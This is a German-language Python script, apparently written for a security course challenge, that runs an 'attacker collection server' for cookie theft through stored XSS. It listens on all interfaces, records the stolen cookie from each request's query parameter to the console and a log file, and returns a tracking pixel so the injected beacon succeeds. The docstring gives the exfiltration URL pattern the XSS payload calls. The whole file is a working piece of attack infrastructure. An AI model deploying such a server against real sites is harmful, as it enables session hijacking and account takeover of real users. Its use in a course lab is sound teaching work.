"""
Angreifer-Sammelserver fuer Challenge 4 (Cookie-Diebstahl via Stored XSS).

Startet einen kleinen HTTP-Server, der JEDEN eingehenden Request protokolliert
und dabei mitgeschickte Daten (z. B. den Cookie-Wert im Query-Parameter) in die
Konsole UND in eine Logdatei schreibt.

Start:   python angreifer_sammelserver.py
Stoppen: Strg+C

Der XSS-Payload im Ticket schickt den Cookie z. B. an:
    http://<DEINE_IP>:8000/klau?c=<cookie>
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote
from datetime import datetime

HOST = "0.0.0.0"   # lauscht auf allen Interfaces -> aus dem Kursnetz erreichbar
PORT = 8000
LOGDATEI = "geklaute_cookies.log"


class SammelHandler(BaseHTTPRequestHandler):
    def _verarbeite(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        cookie = unquote(params.get("c", [""])[0])
        zeit = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        zeile = (
            f"[{zeit}] von {self.client_address[0]}  "
            f"Pfad={parsed.path}  COOKIE={cookie!r}"
        )
        print("\n>>> TREFFER:", zeile)
        with open(LOGDATEI, "a", encoding="utf-8") as f:
            f.write(zeile + "\n")

        # 1x1-Pixel zurueckgeben, damit <img onerror> bzw. new Image() zufrieden ist
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        self.wfile.write(
            b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
            b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
            b"\x00\x00\x02\x02D\x01\x00;"
        )

    # sowohl GET als auch POST annehmen
    do_GET = _verarbeite
    do_POST = _verarbeite

    def log_message(self, *args):
        pass  # Standard-Logzeilen unterdruecken, wir loggen selbst


if __name__ == "__main__":
    print(f"Angreifer-Sammelserver laeuft auf http://{HOST}:{PORT}")
    print(f"Logdatei: {LOGDATEI}")
    print("Warte auf eingehende Cookies ... (Strg+C zum Beenden)")
    HTTPServer((HOST, PORT), SammelHandler).serve_forever()
